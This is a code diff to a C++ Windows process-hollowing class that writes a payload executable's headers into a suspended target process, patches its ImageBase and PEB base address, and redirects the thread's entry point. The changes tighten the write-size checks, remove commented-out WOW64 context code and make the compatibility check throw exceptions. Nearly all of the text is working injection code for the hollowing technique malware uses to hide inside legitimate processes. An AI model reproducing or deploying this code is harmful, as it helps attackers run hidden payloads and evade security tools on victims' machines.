@@ -70,14 +70,14 @@ void Hollowing32Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
     DWORD oldProtection = 0;
     SIZE_T writtenBytes = 0;
     if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, targetBaseAddress, sourceFileContents,
-        sourceNTHeaders->OptionalHeader.SizeOfHeaders, &writtenBytes) || 0 == writtenBytes)
+        sourceNTHeaders->OptionalHeader.SizeOfHeaders, &writtenBytes) || sourceNTHeaders->OptionalHeader.SizeOfHeaders != writtenBytes)
     {
         throw HollowingException("An error occured while writing the payload's headers to the target!");
     }
     // Updating the ImageBase field
     if(0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<LPBYTE>(targetBaseAddress) + sourceDOSHeader->e_lfanew +
         offsetof(IMAGE_NT_HEADERS32, OptionalHeader) + offsetof(IMAGE_OPTIONAL_HEADER32, ImageBase), &targetBaseAddress,
-        sizeof(DWORD), &writtenBytes) || 0 == writtenBytes)
+        sizeof(DWORD), &writtenBytes) || sizeof(DWORD) != writtenBytes)
     {
         throw HollowingException("An error occured while updating the ImageBase field!");
     }
@@ -110,58 +110,6 @@ void Hollowing32Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
 
 void Hollowing32Bit::UpdateTargetProcessEntryPoint(PVOID newEntryPointAddress)
 {
-    /* if (IsWindows64Bit())
-    {
-    #ifdef _WIN64
-        WOW64_CONTEXT threadContext;
-        threadContext.ContextFlags = WOW64_CONTEXT_ALL;
-
-        if (0 == Wow64GetThreadContext(_targetProcessInformation.hThread, &threadContext))
-        {
-            throw HollowingException("An error occured while getting the target's thread context!");
-        }
-
-        threadContext.Eax = reinterpret_cast<intptr_t>(newEntryPointAddress);
-
-        if (0 == Wow64SetThreadContext(_targetProcessInformation.hThread, &threadContext))
-        {
-            throw HollowingException("An error occured while setting the target's thread context!");
-        }
-    #else
-        CONTEXT threadContext;
-        threadContext.ContextFlags = CONTEXT_ALL;
-
-        if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
-        {
-            throw HollowingException("An error occured while getting the target's thread context!");
-        }
-
-        threadContext.Eax = reinterpret_cast<intptr_t>(newEntryPointAddress);
-
-        if (0 == SetThreadContext(_targetProcessInformation.hThread, &threadContext))
-        {
-            throw HollowingException("An error occured while setting the target's thread context!");
-        }
-    #endif
-    }
-    else
-    {
-        CONTEXT threadContext;
-        threadContext.ContextFlags = CONTEXT_ALL;
-
-        if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
-        {
-            throw HollowingException("An error occured while getting the target's thread context!");
-        }
-
-        threadContext.Eax = reinterpret_cast<intptr_t>(newEntryPointAddress);
-
-        if (0 == SetThreadContext(_targetProcessInformation.hThread, &threadContext))
-        {
-            throw HollowingException("An error occured while setting the target's thread context!");
-        }
-    } */
-
     CONTEXT32 threadContext = Get32BitProcessThreadContext(_targetProcessInformation.hThread);
 
     threadContext.Eax = reinterpret_cast<intptr_t>(newEntryPointAddress);
@@ -269,21 +217,6 @@ void Hollowing32Bit::ProcessTargetRelocationBlock(PBASE_RELOCATION_BLOCK baseRel
 
 void Hollowing32Bit::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
 {
-    /* WOW64_CONTEXT threadContext;
-    threadContext.ContextFlags = WOW64_CONTEXT_ALL;
-
-    if (0 == Wow64GetThreadContext(_targetProcessInformation.hThread, &threadContext))
-    {
-        throw HollowingException("An error occured while getting the target's thread context!");
-    }
-
-    SIZE_T writtenBytes = 0;
-    if (0 == WriteProcessMemory(_targetProcessInformation.hProcess, reinterpret_cast<PVOID>(threadContext.Ebx + offsetof(PEB32, ImageBaseAddress)),
-        &processNewBaseAddress, sizeof(DWORD), &writtenBytes) || sizeof(DWORD) != writtenBytes)
-    {
-        throw HollowingException("An error occured while writing the new base address in the target's PEB!");
-    } */
-
     CONTEXT32 threadContext = Get32BitProcessThreadContext(_targetProcessInformation.hThread);
     SIZE_T writtenBytes = 0;
     
@@ -309,10 +242,18 @@ WORD Hollowing32Bit::GetPEFileSubsystem(const PBYTE fileBuffer)
     return ntHeaders->OptionalHeader.Subsystem;
 }
 
-bool Hollowing32Bit::ValidateCompatibility()
+void Hollowing32Bit::ValidateCompatibility()
 {
     WORD payloadSubsystem = GetPEFileSubsystem(_payloadBuffer);
 
-    return (!_isTarget64Bit && !_isPayload64Bit) && ((IMAGE_SUBSYSTEM_WINDOWS_GUI == payloadSubsystem) ||
-        (payloadSubsystem == GetProcessSubsystem(_targetProcessInformation.hProcess)));
+    if (_isTarget64Bit || _isPayload64Bit)
+    {
+        throw IncompatibleImagesException(!_isTarget64Bit ? "The target is not 32-bit!" : "The payload is not 32-bit!");
+    }
+
+    if (!(IMAGE_SUBSYSTEM_WINDOWS_GUI == payloadSubsystem ||
+        payloadSubsystem == GetProcessSubsystem(_targetProcessInformation.hProcess)))
+    {
+        throw IncompatibleImagesException("The processes' subsystem aren't the same, or the payload's subsystem is not GUI!");
+    }
 }
